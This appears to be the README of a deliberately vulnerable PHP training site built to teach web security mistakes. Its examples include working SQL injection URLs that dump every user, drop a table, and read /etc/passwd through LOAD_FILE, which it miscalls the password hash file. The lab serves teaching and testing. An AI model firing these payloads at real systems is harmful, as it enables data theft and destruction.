# Hack This
A collection of common web programming mistakes.

This website, when set up and configured, contains a number of vulnerabilities that can be exploited, including:

* SQL Injection
* XSS (Cross-Site Scripting)
* Session Hijacking

## Setup
To set everything up, you'll need to: 

* Import the file `db.sql` into your database
* Modify the file `consts.php` to correspond to your database
* Access the site and get hacking

## Examples
Examples of vulnerabilities in this web application include:

### SQL Injection
In an SQL injection attack, malicious SQL statements are inserted into an entry field for execution (usually in a data-driven web application). 

* Get information for all users: 
    - `http://localhost/index.php?username=leocadio'%20or%20'1'='1`
    - `http://localhost/index.php?username=leocadio'%20or%20''='`
    - `http://localhost/index.php?id=1%20or%201=1`
* Drop (destroy) invoices table: 
    - `http://localhost/index.php?id=1;drop%20table%20invoices`
* Dump the password hash file from the server: 
    - `http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1`
* Dump several things at once (oh boy): 
    - `http://localhost/index.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world`

## Acknowledgements
This is heavily based on the [php-sploits](https://github.com/jadz/php-sploits) repository by [Jared Mooring](https://github.com/jadz) and [Allan Shone](https://github.com/CerealBoy). Find the slides for their [SydPHP](https://github.com/sydphp) talk [here](http://www.slideshare.net/CerealBoy/sydphp-security).
